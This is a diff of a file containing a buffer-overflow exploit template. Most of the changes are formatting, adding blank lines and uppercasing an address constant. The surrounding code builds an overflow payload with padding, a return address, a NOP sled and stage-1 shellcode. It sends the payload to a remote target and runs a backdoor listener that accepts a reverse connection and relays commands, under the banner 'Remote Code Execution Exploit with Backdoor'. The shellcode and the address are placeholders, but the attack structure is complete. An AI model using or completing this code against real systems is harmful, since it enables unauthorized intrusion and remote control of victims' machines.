@@ -668,6 +668,7 @@ simgr.explore(find=lambda s: "overflow" in s.posix.dumps(1))
 # 4. Identify validation points
 # 5. Find bypass opportunities
 
+
 def analyze_data_flow(function_call):
     for arg in function_call.arguments:
         source = trace_back(arg)
@@ -918,12 +919,13 @@ TARGET_PORT = 8080
 BUFFER_SIZE = 1024
 OFFSET = 512  # Overflow offset
 
+
 def build_exploit_payload():
     """Build exploit payload with overflow + shellcode"""
     payload = b"A" * OFFSET  # Padding to overflow point
 
     # Address to jump to (shellcode location)
-    payload += struct.pack("<I", 0xfeedface)  # JMP ESP or equivalent
+    payload += struct.pack("<I", 0xFEEDFACE)  # JMP ESP or equivalent
 
     # Stage 1 shellcode
     payload += STAGE1_SHELLCODE
@@ -932,6 +934,7 @@ def build_exploit_payload():
     payload = b"\x90" * 32 + payload
 
     return payload
+
 
 def send_exploit(host, port, payload):
     """Send exploit to remote target"""
@@ -945,6 +948,7 @@ def send_exploit(host, port, payload):
 
     print("[+] Exploit sent, waiting for backdoor connection...")
     sock.close()
+
 
 def setup_backdoor_listener():
     """Listen for reverse connection from backdoor"""
@@ -967,6 +971,7 @@ def setup_backdoor_listener():
         response = conn.recv(4096)
         print(response.decode())
 
+
 def main():
     print("=" * 60)
     print("Remote Code Execution Exploit with Backdoor")
@@ -982,6 +987,7 @@ def main():
     # Wait for backdoor connection
     print("[*] Setting up backdoor listener...")
     setup_backdoor_listener()
+
 
 if __name__ == "__main__":
     main()
